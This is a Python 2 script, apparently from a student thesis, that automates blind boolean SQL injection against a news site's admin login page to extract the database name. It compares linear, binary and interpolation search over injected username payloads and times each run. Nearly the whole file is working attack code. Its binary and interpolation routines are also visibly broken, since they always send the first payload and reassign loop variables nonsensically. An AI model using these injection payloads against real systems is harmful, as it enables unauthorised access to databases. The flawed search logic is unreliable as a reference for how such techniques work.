import requests, argparse, sys, threading, time, csv
from datetime import datetime
from itertools import chain, product
from ftplib import FTP

url = 'http://localhost/Berita/admin_login.php'
data = range(0x20, 0x7f)
n = len(data)
low = 0
password = " "

#LINEAR SEARCH
def linearsearch():
	global data, url, password
	start = datetime.now()
	print "Linear Search"	
	for i in range(1, 15):
		for c in data:

			username = " ' OR BINARY substring(database(), %d, 1) = '%s' -- " % (i, chr(c))

			form = {'username': username, 'password': password, 'login': 'Login'}

			response = requests.post(url, data=form)
						
			if "Halaman Administrasi Berita" in response.text:
				sys.stdout.write(chr(c))
				sys.stdout.flush()
				stop = datetime.now()
				print str(stop - start)
				break
			elif "Username atau password salah!" in response.text:
				status = False

#BINARY SEARCH		
def iterBinSearch():
	global data, url, low, password, n
	high = n-1
	start = datetime.now()
	print "\nBinary Search"	
	while high >= low:
		for i in range(1, 15):
			mid = low + (high - low) // 2
			for data[mid] in data:
				username = " ' OR BINARY substring(database(), %d, 1) = '%s' -- " % (i, chr(data[mid]))
				username1 = " ' OR BINARY substring(database(), %d, 1) > '%s' -- " % (i, chr(data[mid]))

				form = {'username': username or username1, 'password': password, 'login': 'Login'}
				response = requests.post(url, data=form)
			
				if username:
					if "Halaman Administrasi Berita" in response.text:
						sys.stdout.write(chr(data[mid]))
						sys.stdout.flush()
						stop = datetime.now()
						print str(stop - start)
					elif "Username atau password salah!" in response.text:
						status = False
				elif username1:
					high = mid - 1
				else:
					low = mid + 1
					
		break
	return False

#INTERPOLATION SEARCH
def interpolasisearch():
	global url, data, password, n, low
	high = n-1
	start = datetime.now()
	print "\nInterpolation Search"
	user2 = " ' OR BINARY substring(database(), 1, 1) >= '%s' -- "% (chr(data[low]))
	user3 = " ' OR BINARY substring(database(), 1, 1) <= '%s' -- "% (chr(data[high]))
	while low <= high and user2 and user3:
		pos = low + int(((float(high - low)/(data[high] - data[low]))*(data[high] - data[low])))
		for i in range(1, 15):
			for data[pos] in data:	
				user1 = " ' OR BINARY substring(database(), %d, 1) = '%s' -- "% (i, chr(data[pos]))
				user4 = " ' OR BINARY substring(database(), %d, 1) < '%s' -- "% (i, chr(data[pos]))
				form = {'username': user1 or user4 or user2 or user3, 'password': password, 'login': 'Login'}
				response = requests.post(url, data=form)
				if user1:
					if "Halaman Administrasi Berita" in response.text:
						sys.stdout.write(chr(data[pos]))
						sys.stdout.flush()
						stop = datetime.now()
						print str(stop - start)	
					elif "Username atau password salah!" in response.text:
						status = False
				elif user4:
					low = pos + 1;
							
				else:
					high = pos -1;
					
		break
	return False

linearsearch()
iterBinSearch()
interpolasisearch()
#AnalisisTA
